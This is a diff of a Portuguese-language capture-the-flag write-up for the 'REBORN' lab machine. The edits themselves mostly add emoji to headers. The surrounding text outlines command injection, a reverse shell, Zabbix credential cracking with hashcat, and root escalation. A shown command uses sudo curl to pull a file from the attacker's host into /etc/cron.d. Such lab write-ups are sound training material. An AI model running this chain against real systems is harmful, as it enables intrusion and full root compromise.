@@ -2,11 +2,11 @@
 
 ![Reborn image](/images/hackingclub-reborn/file-reborn-2025-1.png)
 
-## Sumário
+## 📝 Sumário
 
-A máquina REBORN (dificuldade Easy) apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de command injection no aplicativo web. A exploração inicial permitiu executar comandos no servidor e, a partir daí, acessar o banco de dados do Zabbix. No banco foi possível extrair as credenciais do administrador do painel web, o que levou à autenticação no painel administrativo do Zabbix. Com acesso ao painel/credenciais, foi estabelecida uma shell reversa que concedeu controle interativo sobre a máquina como o usuário que roda o serviço do Zabbix. Esse usuário tinha uma configuração sensível: permissão de sudo para executar o curl — um privilégio que foi usado como vetor para elevar privilégios e alcançar acesso root. Ao final, o atacante conseguiu controle total do sistema e do painel de monitoramento, podendo ler credenciais, modificar configurações e implantar mecanismos de persistência. Essa máquina ilustra bem como uma falha aparentemente localizada (validação de entrada insuficiente levando a command injection) pode ser encadeada — via acesso a banco de dados, credenciais expostas e configurações de sudo permissivas — até um comprometimento completo do ambiente de monitoramento.
+A máquina REBORN apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de `command injection` no aplicativo web. A exploração inicial permitiu executar comandos no servidor e, a partir daí, acessar o banco de dados do `Zabbix`. No banco foi possível extrair as credenciais do administrador do painel web, o que levou à autenticação no painel administrativo do Zabbix. Com acesso ao painel/credenciais, foi estabelecida uma shell reversa que concedeu controle interativo sobre a máquina como o usuário que roda o serviço do Zabbix. Esse usuário tinha uma configuração sensível: permissão de sudo para executar o `curl` — um privilégio que foi usado como vetor para elevar privilégios e alcançar acesso root. Ao final, o atacante conseguiu controle total do sistema e do painel de monitoramento, podendo ler credenciais, modificar configurações e implantar mecanismos de persistência. Essa máquina ilustra bem como uma falha aparentemente localizada (validação de entrada insuficiente levando a command injection) pode ser encadeada — via acesso a banco de dados, credenciais expostas e configurações de sudo permissivas — até um comprometimento completo do ambiente de monitoramento.
 
-## Descoberta de aplicativo web
+## 🔒 Descoberta de aplicativo web
 
 Quando tentamos acessar o web service, somos redirecionados para `reborn.hc`. Precisamos acrescentar isso em nosso arquivo `/etc/hosts`:
 
@@ -15,9 +15,9 @@ curl -I $IP
 echo "$IP reborn.hc" | sudo tee -a /etc/hosts
 ```
 
-## Reconhecimento
+## 👁️‍🗨️ Reconhecimento
 
-### Varedura de portas
+### 🚪 Varedura de portas
 
 O `nmap` foi utilizado para mapear portas e serviços ativos na máquina alvo. O scan revelou apenas duas portas abertas:
 
@@ -32,9 +32,9 @@ nmap -sC -sV -oA reborn.hc
 80/tcp open  http    syn-ack nginx 1.24.0 (Ubuntu)
 ```
 
-## Analisando o aplicativo web
+## 🔎 Analisando o aplicativo web
 
-### Fuzzing de diretórios
+### 📂 Fuzzing de diretórios
 
 Vamos realizar a enumeração de hosts virtuais para descobrir subdomínios ocultos:
 
@@ -52,9 +52,9 @@ Acessando o **index.php** no aplicativo web somos redirecionados para um checado
 
 ![Web fuzzing result](/images/hackingclub-reborn/file-reborn-2025-2.png)
 
-## Explorando a vulnerabilidade
+## 🧑‍💻 Explorando a vulnerabilidade
 
-### Command Injection
+### 💉 Command Injection
 
 Campo Website URL é concatenado numa chamada de sistema (ex.: `curl`) sem validação/sanitização, permitindo injeção de comandos.
 
@@ -76,7 +76,7 @@ A porta (`$port`) é concatenada sem sanitização, portanto um atacante pode in
 
 ![Vulnerability analysis](/images/hackingclub-reborn/file-reborn-2025-6.png)
 
-### Reverse Shell
+### ☠️ Reverse Shell
 
 Aproveitando o input (`$port`) onde não faz o `escapeshellarg`.
 
@@ -108,7 +108,7 @@ hashcat -m 3200 hash wordlist
 
 ![Hashcat cracking](/images/hackingclub-reborn/file-reborn-2025-11.png)
 
-### Explorando o painel de administração do Zabbix
+### ☠️ Explorando o painel de administração do Zabbix
 
 Acessando `http://reborn.hc/zabbix`.
 
@@ -130,7 +130,7 @@ Capturamos a primeira flag.
 
 ![First flag](/images/hackingclub-reborn/file-reborn-2025-15.png)
 
-## Escalando privilégios
+## 📈 Escalando privilégios
 
 ### Permissões
 
@@ -154,7 +154,7 @@ Subindo servidor localmente.
 
 ![Server local](/images/hackingclub-reborn/file-reborn-2025-18.png)
 
-### Obtendo shell de root
+### ☠️ Obtendo shell de root
 
 ```bash
 sudo /usr/bin/curl -fsSL http://10.0.73.93:8000/cron_pwn -o /etc/cron.d/pwn
@@ -174,7 +174,8 @@ sudo /usr/bin/curl -fsSL http://10.0.73.93:8000/cron_pwn -o /etc/cron.d/pwn
 
 ### O que isso faz no sistema
 
-Baixa remotamente um arquivo chamado `cron_pwn` e o coloca no diretório `/etc/cron.d/`, que é usado para configurar tarefas agendadas no cron. Todas as tarefas são executadas a cada um minuto. Isso significa que o arquivo baixado provavelmente contém uma tarefa cron que será executada automaticamente com privilégios de root.
+> ❌ Baixa remotamente um arquivo chamado `cron_pwn` e o coloca no diretório `/etc/cron.d/`, que é usado para configurar tarefas agendadas no cron. Todas as tarefas são executadas a cada um minuto. Isso significa que o arquivo baixado provavelmente contém uma tarefa cron que será executada automaticamente com privilégios de root.
+{: .prompt-danger}
 
 ![Curl download](/images/hackingclub-reborn/file-reborn-2025-19.png)
 
